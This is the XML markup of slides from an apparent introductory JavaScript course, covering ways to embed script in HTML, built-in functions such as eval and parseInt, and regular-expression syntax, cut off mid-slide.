            <a:pPr marL="914400" lvl="1" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="alphaLcParenR"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>inside &lt;body&gt;, executed at that time it is encountered</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>External file</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;script </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="file.js"&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>//code placed here won't be executed!</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>In a link / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> attribute using "javascript:" as protocol</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>href</a:t>
            </a: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javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("yes sir")'&gt;yes&lt;/a&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Event handler parameter of a tag</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	&lt;input type="button" value="Click me"</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="hello()"&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>5.	JavaScript not enabled on browser:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>noscript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;p&gt;Please enable JavaScript in your browser!&lt;/p&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>noscript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6850F1D4-D739-4FEB-B310-12FCC31C4723}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>JavaScript Built-in Functions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B82B9D0-E972-4090-BF82-78490F9AEEC7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>eval</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = evaluates string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and returns result if available. It allows to dynamically run new JavaScript code.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>isNaN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = returns true if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is not a number</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Number(x)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = converts x into a number. Returns NaN if fails.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>parseInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>radix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = parses string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and returns the first integer it founds. Returns NaN when fails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>parseFloat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) = parses string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and returns the first valid floating number it finds. Returns NaN when fails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>String (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = Converts object's value into a string.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"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7C587DC-01BA-40C2-B4FB-EBA86D0B12F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regular Expressions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2AE4895B-688D-459A-9AA8-ABF937000094}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">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pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">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flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RegExp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="2800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"1, 2, 3 and 100"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>match</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/\d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
